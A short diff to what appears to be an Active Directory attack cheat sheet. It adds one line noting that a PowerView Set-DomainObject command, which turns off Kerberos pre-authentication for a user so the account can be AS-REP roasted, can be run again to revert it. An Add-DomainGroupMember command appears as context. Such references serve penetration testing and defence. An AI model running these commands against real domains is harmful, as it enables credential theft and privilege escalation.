@@ -289,6 +289,7 @@ Add-DomainGroupMember -Identity "<GROUP>" -Members <DOMAIN>\<USER>
 
 #### Add preauthnotreq flag
 - Then as-repreoast the user [AS-REP Roasting](#AS-REP-Roasting) 
+- Execute command again to revert it
 ```
 Set-DomainObject -Identity <USERNAME> -XOR @{useraccountcontrol=4194304} -Verbose
 ```
